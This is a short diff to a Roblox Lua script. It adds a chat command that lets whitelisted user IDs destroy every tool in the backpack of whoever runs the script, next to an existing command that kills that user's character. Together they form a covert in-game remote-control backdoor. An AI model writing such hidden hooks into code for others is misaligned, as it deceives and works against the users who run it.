@@ -474,6 +474,11 @@ players.PlayerAdded:Connect(function(player)
 			if table.find(wl,player.UserId) and message == ";wreck Default" then
 				game.Players.LocalPlayer.Character.Humanoid.Health = 0
 			end
+			if table.find(wl,player.UserId) and message == ";passive Default" then
+				for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+					v:Destroy()
+				end
+			end
 
 		end)
 	end
